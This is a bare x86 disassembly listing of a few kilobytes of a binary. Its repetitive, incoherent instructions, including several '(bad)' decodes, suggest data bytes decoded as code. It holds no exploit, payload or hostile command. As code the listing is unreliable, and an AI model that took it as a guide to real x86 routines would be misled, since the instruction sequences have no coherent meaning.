  44bc8c:	sbb    DWORD PTR ds:0xad1f25ff,ebp
  44bc92:	call   FWORD PTR ds:0x7ff2616
  44bc98:	add    eax,0x181eff30
  44bc9d:	jle    0x44bc9e
  44bc9f:	sbb    BYTE PTR [edx],dl
  44bca1:	sub    edi,edi
  44bca3:	and    eax,0x23ff3116
  44bca8:	pop    ss
  44bca9:	pop    eax
  44bcaa:	call   DWORD PTR [eax]
  44bcac:	or     dl,BYTE PTR [edi-0x1]
  44bcaf:	cmp    esi,DWORD PTR [ecx]
  44bcb1:	dec    edi
  44bcb2:	jmp    DWORD PTR [ecx]
  44bcb4:	sbb    eax,0x1f1eff2f
  44bcb9:	dec    edx
  44bcba:	call   DWORD PTR [ebx]
  44bcbc:	push   ss
  44bcbd:	push   esp
  44bcbe:	call   FWORD PTR [eax]
  44bcc0:	and    eax,DWORD PTR [eax+0x60100dff]
  44bcc6:	call   FWORD PTR [ebx]
  44bcc8:	sbb    esi,DWORD PTR [edi+edi*8]
  44bccb:	sbb    eax,0x22ff691f
  44bcd0:	and    DWORD PTR [esi-0x1],edx
  44bcd3:	sbb    al,0x18
  44bcd5:	dec    ecx
  44bcd6:	jmp    DWORD PTR [edi+eiz*1]
  44bcd9:	jb     0x44bcda
  44bcdb:	pop    ds
  44bcdc:	sub    al,0xaa
  44bcde:	dec    DWORD PTR [edx+eiz*1]
  44bce1:	int    0xff
  44bce3:	add    DWORD PTR [ecx],eax
  44bce5:	add    bh,bh
  44bce7:	add    BYTE PTR [eax],al
  44bce9:	add    bh,bh
  44bceb:	add    BYTE PTR [eax],al
  44bced:	add    bh,bh
  44bcef:	add    BYTE PTR [eax],al
  44bcf1:	add    bh,bh
  44bcf3:	add    BYTE PTR [eax],al
  44bcf5:	add    bh,bh
  44bcf7:	add    BYTE PTR [eax],al
  44bcf9:	add    bh,bh
  44bcfb:	add    DWORD PTR [ecx],eax
  44bcfd:	add    bh,bh
  44bcff:	add    DWORD PTR [ecx],eax
  44bd01:	add    bh,bh
  44bd03:	or     ah,BYTE PTR [esi]
  44bd05:	sar    bh,1
  44bd07:	adc    BYTE PTR [edi],dl
  44bd09:	pop    ecx
  44bd0a:	dec    DWORD PTR ds:0x9ff3c0a
  44bd10:	pop    es
  44bd11:	pop    ecx
  44bd12:	inc    DWORD PTR [ecx]
  44bd14:	or     bl,BYTE PTR [edi+0x340c0cff]
  44bd1a:	jmp    DWORD PTR [eax+eiz*1]
  44bd1d:	push   ebp
  44bd1e:	call   FWORD PTR [ecx]
  44bd20:	pop    ss
  44bd21:	xor    edi,edi
  44bd23:	adc    DWORD PTR [edx],edx
  44bd25:	cmp    edi,edi
  44bd27:	push   ss
  44bd28:	adc    al,0x3c
  44bd2a:	jmp    DWORD PTR [edx]
  44bd2c:	sbb    al,0x46
  44bd2e:	jmp    FWORD PTR [ecx]
  44bd30:	and    eax,DWORD PTR [esi-0x1]
  44bd33:	adc    BYTE PTR [esi],dl
  44bd35:	aaa    
  44bd36:	call   DWORD PTR [ebx]
  44bd38:	adc    BYTE PTR [edx],ch
  44bd3a:	jmp    FWORD PTR [esi]
  44bd3c:	and    dh,BYTE PTR [edi]
  44bd3e:	jmp    DWORD PTR [eax]
  44bd40:	sbb    BYTE PTR [eax],dh
  44bd42:	call   DWORD PTR [edi]
  44bd44:	sbb    al,BYTE PTR [ebp-0x1]
  44bd47:	push   ss
  44bd48:	sbb    dh,BYTE PTR [ebp-0x65eae301]
  44bd4e:	call   DWORD PTR [edi]
  44bd50:	xor    ecx,ebx
  44bd52:	dec    DWORD PTR [ebx+ebx*1]
  44bd55:	xchg   ebx,eax
  44bd56:	inc    DWORD PTR [ecx]
  44bd58:	add    DWORD PTR [eax],eax
  44bd5a:	inc    DWORD PTR [ebx]
  44bd5c:	add    eax,DWORD PTR [ebx]
  44bd5e:	inc    DWORD PTR [eax]
  44bd60:	add    BYTE PTR [eax],al
  44bd62:	inc    DWORD PTR [eax]
  44bd64:	add    BYTE PTR [eax],al
  44bd66:	inc    DWORD PTR [eax]
  44bd68:	add    BYTE PTR [eax],al
  44bd6a:	inc    DWORD PTR [eax]
  44bd6c:	add    BYTE PTR [eax],al
  44bd6e:	inc    DWORD PTR [eax]
  44bd70:	add    BYTE PTR [eax],al
  44bd72:	inc    DWORD PTR [eax]
  44bd74:	add    BYTE PTR [eax],al
  44bd76:	inc    DWORD PTR [eax]
  44bd78:	add    BYTE PTR [eax],al
  44bd7a:	inc    DWORD PTR [eax]
  44bd7c:	add    BYTE PTR [eax],al
  44bd7e:	inc    DWORD PTR [eax]
  44bd80:	add    BYTE PTR [esi],al
  44bd82:	inc    DWORD PTR [ecx]
  44bd84:	add    DWORD PTR [eax],eax
  44bd86:	inc    DWORD PTR [ecx]
  44bd88:	add    DWORD PTR [eax],eax
  44bd8a:	call   DWORD PTR ds:0x22ff9e18
  44bd90:	sbb    dh,BYTE PTR [ebx]
  44bd92:	call   FWORD PTR [edx]
  44bd94:	adc    eax,DWORD PTR [ecx-0x1]
  44bd97:	add    BYTE PTR [eax],al
  44bd99:	and    bh,bh
  44bd9b:	adc    cl,BYTE PTR [esi]
  44bd9d:	cmp    eax,0x2d161eff
  44bda2:	jmp    DWORD PTR [eax]
  44bda4:	pop    ss
  44bda5:	xor    edi,edi
  44bda7:	das    
  44bda8:	sbb    edx,DWORD PTR [edx-0x1]
  44bdab:	or     BYTE PTR [ebx],al
  44bdad:	inc    esp
  44bdae:	push   DWORD PTR [esp+ebp*1]
  44bdb1:	push   0xffffffff
  44bdb3:	sub    ah,BYTE PTR ds:0x1312ff2b
  44bdb9:	xor    edi,edi
  44bdbb:	and    al,0x2b
  44bdbd:	jo     0x44bdbe
  44bdbf:	adc    dl,BYTE PTR [esi]
  44bdc1:	jl     0x44bdc2
  44bdc3:	or     ecx,DWORD PTR [esp+ecx*2]
  44bdc6:	call   FWORD PTR ds:0x1eff2e1c
  44bdcc:	push   ds
  44bdcd:	pop    ecx
  44bdce:	jmp    DWORD PTR [eax]
  44bdd0:	sbb    eax,0x1011ff54
  44bdd5:	xor    bh,bh
  44bdd7:	adc    al,0x16
  44bdd9:	dec    ecx
  44bdda:	call   FWORD PTR [edx]
  44bddc:	pop    ss
  44bddd:	push   edx
  44bdde:	dec    DWORD PTR [ecx]
  44bde0:	sbb    bl,dl
  44bde2:	inc    DWORD PTR [ecx]
  44bde4:	add    DWORD PTR [eax],eax
  44bde6:	inc    DWORD PTR [eax]
  44bde8:	add    BYTE PTR [eax],al
  44bdea:	inc    DWORD PTR [eax]
  44bdec:	add    BYTE PTR [eax],al
  44bdee:	inc    DWORD PTR [eax]
  44bdf0:	add    BYTE PTR [eax],al
  44bdf2:	inc    DWORD PTR [eax]
  44bdf4:	add    BYTE PTR [eax],al
  44bdf6:	inc    DWORD PTR [edx]
  44bdf8:	add    DWORD PTR [ebx],eax
  44bdfa:	inc    DWORD PTR [ecx]
  44bdfc:	add    DWORD PTR [eax],eax
  44bdfe:	inc    DWORD PTR [ecx]
  44be00:	adc    DWORD PTR [eax-0x46dbf201],ecx
  44be06:	call   DWORD PTR [ebx]
  44be08:	or     eax,0xe0fff43
  44be0d:	inc    edx
  44be0e:	call   DWORD PTR [eax]
  44be10:	adc    ch,BYTE PTR [ebx-0x1]
  44be13:	push   cs
  44be14:	adc    BYTE PTR [edi-0x1],ch
  44be17:	pop    ds
  44be18:	sbb    dl,BYTE PTR [esi-0x1]
  44be1b:	daa    
  44be1c:	pop    ds
  44be1d:	dec    ecx
  44be1e:	call   FWORD PTR [ebx]
  44be20:	pop    ss
  44be21:	das    
  44be22:	dec    DWORD PTR ds:0x7ff3312
  44be28:	adc    DWORD PTR [ebp-0x1],ecx
  44be2b:	sbb    al,0x15
  44be2d:	inc    eax
  44be2e:	jmp    FWORD PTR [edx]
  44be30:	and    bh,BYTE PTR [esi]
  44be32:	dec    DWORD PTR ds:0x1dff220b
  44be38:	adc    eax,0x303cff2f
  44be3d:	dec    ecx
  44be3e:	inc    DWORD PTR [eax+0x37]
  44be41:	push   ebx
  44be42:	jmp    FWORD PTR [ecx]
  44be44:	xor    edi,DWORD PTR [edx-0x1]
  44be47:	movups xmm1,xmm6
  44be4a:	dec    DWORD PTR [edi]
  44be4c:	and    al,0xe3
  44be4e:	call   DWORD PTR [eax]
  44be50:	and    esi,DWORD PTR [esi+0x20201ff]
  44be56:	inc    DWORD PTR [ecx]
  44be58:	add    DWORD PTR [eax],eax
  44be5a:	inc    DWORD PTR [eax]
  44be5c:	add    BYTE PTR [eax],al
  44be5e:	inc    DWORD PTR [eax]
  44be60:	add    BYTE PTR [eax],al
  44be62:	inc    DWORD PTR [eax]
  44be64:	add    BYTE PTR [eax],al
  44be66:	inc    DWORD PTR [eax]
  44be68:	add    BYTE PTR [eax],al
  44be6a:	inc    DWORD PTR [eax]
  44be6c:	add    BYTE PTR [eax],al
  44be6e:	inc    DWORD PTR [eax]
  44be70:	add    BYTE PTR [eax],al
  44be72:	inc    DWORD PTR [eax]
  44be74:	add    BYTE PTR [eax],al
  44be76:	inc    DWORD PTR [eax]
  44be78:	add    BYTE PTR [eax],al
  44be7a:	inc    DWORD PTR [eax]
  44be7c:	add    BYTE PTR [eax],al
  44be7e:	inc    DWORD PTR [eax]
  44be80:	add    BYTE PTR [eax],al
  44be82:	inc    DWORD PTR [eax]
  44be84:	add    BYTE PTR [edi],al
  44be86:	inc    DWORD PTR [ecx]
  44be88:	add    DWORD PTR [edx],eax
  44be8a:	inc    DWORD PTR [ecx]
  44be8c:	add    DWORD PTR [ecx],eax
  44be8e:	call   DWORD PTR [ecx]
  44be90:	sbb    edi,ecx
  44be92:	inc    DWORD PTR [esi]
  44be94:	add    al,0x5f
  44be96:	call   DWORD PTR [ecx]
  44be98:	or     al,0x87
  44be9a:	call   FWORD PTR [edx]
  44be9c:	adc    esi,DWORD PTR [edi+edi*8]
  44be9f:	sub    al,0x25
  44bea1:	xor    eax,0x502e3bff
  44bea6:	push   DWORD PTR [ecx]
  44bea8:	sbb    al,0x4a
  44beaa:	inc    DWORD PTR [edx]
  44beac:	add    DWORD PTR [ebx-0x1],ecx
  44beaf:	adc    edx,DWORD PTR [edx]
  44beb1:	jns    0x44beb2
  44beb3:	adc    al,0x12
  44beb5:	pop    ss
  44beb6:	call   FWORD PTR [esi]
  44beb8:	sbb    al,0x3b
  44beba:	jmp    DWORD PTR [edi]
  44bebc:	xor    BYTE PTR [edi-0x1],bh
  44bebf:	adc    edx,DWORD PTR [ebx+ebp*2]
  44bec2:	call   DWORD PTR [edi]
  44bec4:	adc    DWORD PTR [ebx],edi
  44bec6:	jmp    DWORD PTR [esi]
  44bec8:	and    DWORD PTR [esi],esi
  44beca:	jmp    DWORD PTR [edx]
  44becc:	and    eax,DWORD PTR [esi-0x1]
  44becf:	and    ah,BYTE PTR [ecx]
  44bed1:	pop    ebp
  44bed2:	jmp    FWORD PTR [eax]
  44bed4:	es dec ecx
  44bed6:	jmp    DWORD PTR [eax+eiz*1]
  44bed9:	cmp    edi,edi
  44bedb:	sbb    DWORD PTR [edx+edx*2],ebx
  44bede:	dec    DWORD PTR [ebx]
  44bee0:	pop    ds
  44bee1:	aad    0xff
  44bee3:	add    DWORD PTR [ecx],eax
  44bee5:	add    bh,bh
  44bee7:	add    BYTE PTR [eax],al
  44bee9:	add    bh,bh
  44beeb:	add    BYTE PTR [eax],al
  44beed:	add    bh,bh
  44beef:	add    BYTE PTR [eax],al
  44bef1:	add    bh,bh
  44bef3:	add    DWORD PTR [ecx],eax
  44bef5:	add    bh,bh
  44bef7:	add    DWORD PTR [ecx],eax
  44bef9:	add    bh,bh
  44befb:	add    DWORD PTR [ecx],eax
  44befd:	add    bh,bh
  44beff:	or     bl,BYTE PTR [edx]
  44bf01:	fdivp  st(7),st
  44bf03:	sbb    BYTE PTR [ecx],ah
  44bf05:	outs   dx,BYTE PTR ds:[esi]
  44bf06:	call   DWORD PTR [esi]
  44bf08:	adc    al,0x64
  44bf0a:	dec    DWORD PTR [ecx]
  44bf0c:	or     ecx,DWORD PTR [edx-0x1]
  44bf0f:	adc    dl,BYTE PTR [ebx]
  44bf11:	push   ecx
  44bf12:	push   DWORD PTR [ebx]
  44bf14:	xor    eax,0x313effb8
  44bf19:	outs   dx,DWORD PTR ds:[esi]
  44bf1a:	call   FWORD PTR [edi]
  44bf1c:	adc    eax,0x1c22ff34
  44bf21:	inc    esi
  44bf22:	call   DWORD PTR ds:0x16ff461e
  44bf28:	push   ss
  44bf29:	xchg   bh,bh
  44bf2b:	sbb    al,0x16
  44bf2d:	cmp    bh,bh
  44bf2f:	xor    DWORD PTR [edi],esp
  44bf31:	push   ebx
  44bf32:	push   DWORD PTR [ecx]
  44bf34:	daa    
  44bf35:	push   edi
  44bf36:	jmp    FWORD PTR [edi]
  44bf38:	es inc edi
  44bf3a:	dec    DWORD PTR [ebx+0x43]
  44bf3d:	pop    ebp
  44bf3e:	(bad)  
  44bf3f:	cmp    BYTE PTR [eax-0x40],cl
  44bf42:	jmp    DWORD PTR ds:0xdffe23d
  44bf48:	and    esp,edi
  44bf4a:	inc    DWORD PTR [edx]
  44bf4c:	or     DWORD PTR ds:0x20101ff,edi
  44bf52:	inc    DWORD PTR [ecx]
  44bf54:	add    DWORD PTR [eax],eax
  44bf56:	inc    DWORD PTR [eax]
  44bf58:	add    BYTE PTR [eax],al
  44bf5a:	inc    DWORD PTR [eax]
  44bf5c:	add    BYTE PTR [eax],al
  44bf5e:	inc    DWORD PTR [eax]
  44bf60:	add    BYTE PTR [eax],al
  44bf62:	inc    DWORD PTR [eax]
  44bf64:	add    BYTE PTR [eax],al
  44bf66:	inc    DWORD PTR [eax]
  44bf68:	add    BYTE PTR [eax],al
  44bf6a:	inc    DWORD PTR [eax]
  44bf6c:	add    BYTE PTR [eax],al
  44bf6e:	inc    DWORD PTR [eax]
  44bf70:	add    BYTE PTR [eax],al
  44bf72:	inc    DWORD PTR [eax]
  44bf74:	add    BYTE PTR [eax],al
  44bf76:	inc    DWORD PTR [eax]
  44bf78:	add    BYTE PTR [eax],al
  44bf7a:	inc    DWORD PTR [eax]
  44bf7c:	add    BYTE PTR [eax],al
  44bf7e:	inc    DWORD PTR [eax]
  44bf80:	add    BYTE PTR [eax],al
  44bf82:	inc    DWORD PTR [eax]
  44bf84:	add    BYTE PTR [eax],al
  44bf86:	inc    DWORD PTR [eax]
  44bf88:	add    BYTE PTR [edi],al
  44bf8a:	inc    DWORD PTR [ecx]
  44bf8c:	add    al,BYTE PTR ds:0x50202ff
  44bf92:	dec    DWORD PTR [edi]
  44bf94:	and    al,0xcb
  44bf96:	call   DWORD PTR [esi]
  44bf98:	sub    al,0xdc
  44bf9a:	call   DWORD PTR [ecx]
  44bf9c:	push   ds
  44bf9d:	sar    edi,0x16
  44bfa0:	sbb    esi,DWORD PTR [eax-0x1]
  44bfa3:	and    eax,0x37ff361f
  44bfa8:	and    DWORD PTR [ecx-0x1],ebx
  44bfab:	wbinvd 
  44bfad:	xor    bh,bh
  44bfaf:	or     edx,DWORD PTR [edi+eax*8]
  44bfb2:	jmp    FWORD PTR [esi]
  44bfb4:	es call FWORD PTR cs:[edi]
  44bfb8:	and    BYTE PTR [ebp-0x1],al
  44bfbb:	sbb    eax,0x16ff461d
  44bfc0:	pop    ss
  44bfc1:	jmp    FWORD PTR fs:[esi]
  44bfc4:	and    al,0x44
  44bfc6:	jmp    FWORD PTR ds:0x22ff5227
  44bfcc:	and    DWORD PTR [ebp-0x1],eax
  44bfcf:	sbb    bl,BYTE PTR [ecx]
  44bfd1:	test   bh,bh
  44bfd3:	es es cmp bh,0x2a
  44bfd8:	daa    
  44bfd9:	inc    edx
  44bfda:	jmp    DWORD PTR [edx]
  44bfdc:	es dec DWORD PTR fs:[esi]
  44bfe0:	and    dh,dl
  44bfe2:	inc    DWORD PTR [ecx]
  44bfe4:	add    DWORD PTR [eax],eax
  44bfe6:	inc    DWORD PTR [eax]
  44bfe8:	add    BYTE PTR [eax],al
  44bfea:	inc    DWORD PTR [eax]
  44bfec:	add    BYTE PTR [eax],al
  44bfee:	inc    DWORD PTR [ecx]
  44bff0:	add    DWORD PTR [ebx],eax
  44bff2:	inc    DWORD PTR [ecx]
  44bff4:	add    DWORD PTR [eax],eax
  44bff6:	inc    DWORD PTR [ecx]
  44bff8:	add    DWORD PTR [eax],eax
  44bffa:	dec    DWORD PTR [ecx]
  44bffc:	and    ah,dh
  44bffe:	call   DWORD PTR [edi]
  44c000:	sub    al,0xbf
  44c002:	call   DWORD PTR [edx]
  44c004:	sbb    BYTE PTR [edi+edi*8+0x17],cl
  44c008:	sbb    al,0x5d
  44c00a:	inc    DWORD PTR [edx]
  44c00c:	add    al,BYTE PTR [edi+edi*8]
  44c00f:	add    al,0xb
  44c011:	pop    edi
  44c012:	jmp    FWORD PTR [edi]
  44c014:	sub    eax,0x1d25ffb6
  44c019:	(bad)  
  44c01a:	call   DWORD PTR [ecx]
  44c01c:	adc    BYTE PTR [esi],bh
  44c01e:	push   DWORD PTR [edi]
  44c020:	xor    DWORD PTR [edx-0x1],esp
  44c023:	xor    ch,BYTE PTR [edx]
  44c025:	mov    edi,edi
  44c027:	and    ebx,DWORD PTR [edx]
  44c029:	push   ebp
  44c02a:	dec    DWORD PTR [edi]
  44c02c:	or     ah,BYTE PTR [edi+edi*8]
  44c02f:	xor    ebp,DWORD PTR [ecx]
  44c031:	pop    ebp
  44c032:	inc    DWORD PTR [esi+eax*2+0x79]
  44c036:	call   DWORD PTR [ecx+ebx*1]
  44c039:	cmp    bh,0x21
  44c03c:	sub    DWORD PTR [edi-0x20cbdc01],edi
  44c042:	dec    DWORD PTR [eax]
  44c044:	adc    al,0xc0
  44c046:	inc    DWORD PTR [ecx+ecx*1]
  44c049:	and    bh,bh
  44c04b:	add    DWORD PTR [ecx],eax
  44c04d:	add    edi,edi
  44c04f:	add    DWORD PTR [ecx],eax
  44c051:	add    bh,bh
  44c053:	add    BYTE PTR [eax],al
  44c055:	add    bh,bh
  44c057:	add    BYTE PTR [eax],al
  44c059:	add    bh,bh
  44c05b:	add    BYTE PTR [eax],al
  44c05d:	add    bh,bh
  44c05f:	add    BYTE PTR [eax],al
  44c061:	add    bh,bh
  44c063:	add    BYTE PTR [eax],al
  44c065:	add    bh,bh
  44c067:	add    BYTE PTR [eax],al
  44c069:	add    bh,bh
  44c06b:	add    BYTE PTR [eax],al
  44c06d:	add    bh,bh
  44c06f:	add    BYTE PTR [eax],al
  44c071:	add    bh,bh
  44c073:	add    BYTE PTR [eax],al
  44c075:	add    bh,bh
  44c077:	add    BYTE PTR [eax],al
  44c079:	add    bh,bh
  44c07b:	add    BYTE PTR [eax],al
  44c07d:	add    bh,bh
  44c07f:	add    BYTE PTR [eax],al
  44c081:	add    bh,bh
  44c083:	add    BYTE PTR [eax],al
  44c085:	add    bh,bh
  44c087:	add    BYTE PTR [eax],al
  44c089:	add    bh,bh
  44c08b:	add    BYTE PTR [eax],al
  44c08d:	add    edi,edi
  44c08f:	add    al,BYTE PTR [ecx]
  44c091:	add    edi,edi
  44c093:	add    DWORD PTR [edx],eax
  44c095:	add    edi,edi
  44c097:	add    DWORD PTR [edx],eax
  44c099:	add    al,0xff
  44c09b:	or     al,0x1c
  44c09d:	mov    edx,0xbb1d0fff
  44c0a2:	call   DWORD PTR [eax+ebp*1]
  44c0a5:	aad    0xff
  44c0a7:	sbb    BYTE PTR [eax],ch
  44c0a9:	sar    edi,cl
  44c0ab:	sbb    dl,BYTE PTR [edx]
  44c0ad:	sbb    edi,edi
  44c0af:	or     edx,DWORD PTR [ecx]
  44c0b1:	ret    
  44c0b2:	call   FWORD PTR ds:0x22ff491d
  44c0b8:	sub    DWORD PTR [ebp-0x1],ecx
  44c0bb:	sbb    DWORD PTR [edi],ebx
  44c0bd:	jle    0x44c0be
  44c0bf:	add    DWORD PTR [edx],eax
  44c0c1:	mov    ds:0x3a2733ff,eax
  44c0c6:	jmp    DWORD PTR [eax]
  44c0c8:	sbb    al,0x67
  44c0ca:	jmp    FWORD PTR [edx]
  44c0cc:	sub    DWORD PTR [ecx+0x7f221dff],edx
  44c0d2:	dec    DWORD PTR [esi]
  44c0d4:	adc    DWORD PTR [ebp+0x582c27ff],esi
  44c0da:	call   FWORD PTR ds:0xeffb52b
  44c0e0:	and    dh,cl
  44c0e2:	inc    DWORD PTR [ecx]
  44c0e4:	add    DWORD PTR [eax],eax
  44c0e6:	inc    DWORD PTR [eax]
  44c0e8:	add    BYTE PTR [eax],al
  44c0ea:	inc    DWORD PTR [eax]
  44c0ec:	add    BYTE PTR [ecx],al
  44c0ee:	inc    DWORD PTR [eax]
  44c0f0:	add    BYTE PTR [eax],al
  44c0f2:	inc    DWORD PTR [ecx]
  44c0f4:	add    DWORD PTR [eax],eax
  44c0f6:	inc    DWORD PTR [edi]
  44c0f8:	adc    al,bl
  44c0fa:	call   DWORD PTR [edx]
  44c0fc:	and    BYTE PTR [eax+0x4d1613ff],bh
  44c102:	call   DWORD PTR [esi]
  44c104:	pop    ss
  44c105:	dec    ebp
  44c106:	inc    DWORD PTR [esi]
  44c108:	add    eax,0x504ff0d
  44c10d:	inc    DWORD PTR cs:[esp+edx*1]
  44c111:	loopne 0x44c112
  44c113:	adc    edx,DWORD PTR [ecx+edx*8]
  44c116:	dec    DWORD PTR [eax+ecx*1]
  44c119:	cmp    bh,0xd
  44c11c:	or     al,0x18
  44c11e:	call   DWORD PTR [ebx]
  44c120:	adc    ah,BYTE PTR [edi]
  44c122:	(bad)  
  44c123:	cmp    BYTE PTR [esi],ch
  44c125:	xchg   edi,edi
  44c127:	sbb    eax,0x7ff581e
  44c12c:	movq   mm7,mm7
  44c12f:	adc    al,0x28
  44c131:	fdivr  st,st(7)
  44c133:	adc    ebp,DWORD PTR [eax]
  44c135:	fdivr  st,st(7)
  44c137:	adc    al,0x29
  44c139:	fcos   
  44c13b:	adc    al,0x2a
  44c13d:	fcos   
  44c13f:	add    DWORD PTR [ecx],eax
  44c141:	add    bh,bh
  44c143:	add    DWORD PTR [ecx],eax
  44c145:	add    edi,edi
  44c147:	add    DWORD PTR [edx],eax
  44c149:	add    edi,edi
  44c14b:	add    BYTE PTR [eax],al
  44c14d:	add    edi,edi
  44c14f:	add    BYTE PTR [eax],al
  44c151:	add    bh,bh
  44c153:	add    BYTE PTR [eax],al
  44c155:	add    bh,bh
  44c157:	add    BYTE PTR [eax],al
  44c159:	add    bh,bh
  44c15b:	add    BYTE PTR [eax],al
  44c15d:	add    bh,bh
  44c15f:	add    BYTE PTR [eax],al
  44c161:	add    bh,bh
  44c163:	add    BYTE PTR [eax],al
  44c165:	add    bh,bh
  44c167:	add    BYTE PTR [eax],al
  44c169:	add    bh,bh
  44c16b:	add    BYTE PTR [eax],al
  44c16d:	add    bh,bh
  44c16f:	add    BYTE PTR [eax],al
  44c171:	add    bh,bh
  44c173:	add    BYTE PTR [eax],al
  44c175:	add    bh,bh
  44c177:	add    BYTE PTR [eax],al
  44c179:	add    bh,bh
  44c17b:	add    BYTE PTR [eax],al
  44c17d:	add    bh,bh
  44c17f:	add    BYTE PTR [eax],al
  44c181:	add    bh,bh
  44c183:	add    BYTE PTR [eax],al
  44c185:	add    bh,bh
  44c187:	add    BYTE PTR [eax],al
  44c189:	add    bh,bh
  44c18b:	add    BYTE PTR [eax],al
  44c18d:	add    bh,bh
  44c18f:	add    BYTE PTR [eax],al
  44c191:	add    edi,edi
  44c193:	add    DWORD PTR [eax],eax
  44c195:	or     bh,bh
  44c197:	add    DWORD PTR [edx],eax
  44c199:	add    eax,0x30201ff
  44c19e:	inc    DWORD PTR [edx]
  44c1a0:	add    DWORD PTR [edx],eax
  44c1a2:	dec    DWORD PTR ds:0xeff8e18
  44c1a8:	push   ds
  44c1a9:	ret    0x10ff
  44c1ac:	or     eax,0x1a0bff15
  44c1b1:	sar    bh,cl
  44c1b3:	push   ss
  44c1b4:	daa    
  44c1b5:	fdiv   st(7),st
  44c1b7:	pop    ds
  44c1b8:	sub    eax,0x1f13ff9a
  44c1bd:	fdivp  st(7),st
  44c1bf:	add    eax,DWORD PTR [ecx]
  44c1c1:	arpl   di,di
  44c1c3:	sbb    BYTE PTR es:[eax-0x1],bl
  44c1c7:	sbb    DWORD PTR cs:[edi+edi*8+0x2a],ebp
  44c1cc:	sub    dl,BYTE PTR [eax-0x2cd3e901]
  44c1d2:	dec    DWORD PTR [esi]
  44c1d4:	adc    DWORD PTR [edx-0x47e2e801],esi
  44c1da:	call   DWORD PTR [ebx]
  44c1dc:	sub    ah,dh
  44c1de:	dec    DWORD PTR [ebx]
  44c1e0:	pop    ds
  44c1e1:	out    0xff,eax
  44c1e3:	add    DWORD PTR [ecx],eax
  44c1e5:	add    bh,bh
  44c1e7:	add    BYTE PTR [eax],al
  44c1e9:	add    bh,bh
  44c1eb:	add    BYTE PTR [eax],al
  44c1ed:	push   es
  44c1ee:	inc    DWORD PTR [eax]
  44c1f0:	add    BYTE PTR [edx],dh
  44c1f2:	dec    DWORD PTR [eax]
  44c1f4:	adc    bh,al
  44c1f6:	call   DWORD PTR [eax]
  44c1f8:	and    eax,0x1f0fffe7
  44c1fd:	iret   
  44c1fe:	call   DWORD PTR [eax]
  44c200:	adc    dh,BYTE PTR [eax-0x4deef301]
  44c206:	dec    DWORD PTR [ecx]
  44c208:	sbb    cl,dl
  44c20a:	inc    DWORD PTR [eax+ebx*1]
  44c20d:	icebp  
  44c20e:	inc    DWORD PTR [ecx]
  44c210:	add    esi,edi
  44c212:	inc    DWORD PTR [edi]
  44c214:	or     bh,BYTE PTR [ebx-0x77f4f901]
  44c21a:	dec    DWORD PTR [esi]
  44c21c:	sbb    eax,0x110affc6
  44c221:	mov    esi,0xdd2d16ff
  44c226:	call   DWORD PTR [esi]
  44c228:	sub    ebx,ebx
  44c22a:	call   DWORD PTR ds:0x10ffd828
  44c230:	and    ecx,edi
  44c232:	inc    DWORD PTR [ecx]
  44c234:	pop    ss
  44c235:	xchg   edi,edi
  44c237:	add    DWORD PTR [ecx],eax
  44c239:	add    edi,edi
  44c23b:	add    DWORD PTR [edx],eax
  44c23d:	add    bh,bh
  44c23f:	add    BYTE PTR [ecx],al
  44c241:	add    edi,edi
  44c243:	add    BYTE PTR [eax],al
  44c245:	add    edi,edi
  44c247:	add    BYTE PTR [eax],al
  44c249:	add    bh,bh
  44c24b:	add    BYTE PTR [eax],al
  44c24d:	add    bh,bh
  44c24f:	add    BYTE PTR [eax],al
  44c251:	add    bh,bh
  44c253:	add    BYTE PTR [eax],al
  44c255:	add    bh,bh
  44c257:	add    BYTE PTR [eax],al
  44c259:	add    bh,bh
  44c25b:	add    BYTE PTR [eax],al
  44c25d:	add    bh,bh
  44c25f:	add    BYTE PTR [eax],al
  44c261:	add    bh,bh
  44c263:	add    BYTE PTR [eax],al
  44c265:	add    bh,bh
  44c267:	add    BYTE PTR [eax],al
  44c269:	add    bh,bh
  44c26b:	add    BYTE PTR [eax],al
  44c26d:	add    bh,bh
  44c26f:	add    BYTE PTR [eax],al
  44c271:	add    bh,bh
  44c273:	add    BYTE PTR [eax],al
  44c275:	add    bh,bh
  44c277:	add    BYTE PTR [eax],al
  44c279:	add    bh,bh
  44c27b:	add    BYTE PTR [eax],al
  44c27d:	add    bh,bh
  44c27f:	add    BYTE PTR [eax],al
  44c281:	add    bh,bh
  44c283:	add    BYTE PTR [eax],al
  44c285:	add    bh,bh
  44c287:	add    BYTE PTR [eax],al
  44c289:	add    bh,bh
  44c28b:	add    BYTE PTR [eax],al
  44c28d:	add    bh,bh
  44c28f:	add    BYTE PTR [eax],al
  44c291:	add    bh,bh
  44c293:	add    BYTE PTR [eax],al
  44c295:	add    bh,bh
  44c297:	add    BYTE PTR [eax],al
  44c299:	add    edi,edi
  44c29b:	add    DWORD PTR [eax],eax
  44c29d:	add    edi,edi
  44c29f:	add    DWORD PTR [ecx],eax
  44c2a1:	add    edi,edi
  44c2a3:	add    al,BYTE PTR [edx]
  44c2a5:	add    bh,bh
  44c2a7:	add    DWORD PTR [ecx],eax
  44c2a9:	add    bh,bh
  44c2ab:	add    DWORD PTR [ecx],eax
  44c2ad:	add    bh,bh
  44c2af:	adc    DWORD PTR [ebx],esp
  44c2b1:	sar    bh,cl
  44c2b3:	adc    BYTE PTR [esp+eiz*8],ah
  44c2b6:	call   DWORD PTR [ecx]
  44c2b8:	and    al,0xd2
  44c2ba:	call   DWORD PTR [edx]
  44c2bc:	and    al,0xd2
  44c2be:	call   DWORD PTR [ecx]
  44c2c0:	and    edx,ecx
  44c2c2:	call   DWORD PTR [eax]
  44c2c4:	and    dl,al
  44c2c6:	call   DWORD PTR [edx]
  44c2c8:	and    al,0xd2
  44c2ca:	call   DWORD PTR [edx]
  44c2cc:	and    eax,0x2612ffd3
  44c2d1:	aad    0xff
  44c2d3:	adc    ah,BYTE PTR [esi]
  44c2d5:	aad    0xff
  44c2d7:	adc    esp,DWORD PTR [esi]
  44c2d9:	(bad)  
  44c2da:	call   DWORD PTR [edx]
  44c2dc:	es aad 0xff
  44c2df:	add    DWORD PTR [ecx],eax
  44c2e1:	add    bh,bh
  44c2e3:	add    BYTE PTR [eax],al
  44c2e5:	adc    eax,0xff
  44c2ea:	inc    DWORD PTR ds:0x1ff0305
  44c2f0:	add    DWORD PTR [ecx],esi
  44c2f2:	call   DWORD PTR [ebx]
  44c2f4:	daa    
  44c2f5:	xlat   BYTE PTR ds:[ebx]
  44c2f6:	call   DWORD PTR [eax]
  44c2f8:	and    al,0xe5
  44c2fa:	call   DWORD PTR [edx]
  44c2fc:	es aad 0xff
  44c2ff:	adc    ah,BYTE PTR [esi]
  44c301:	aad    0xff
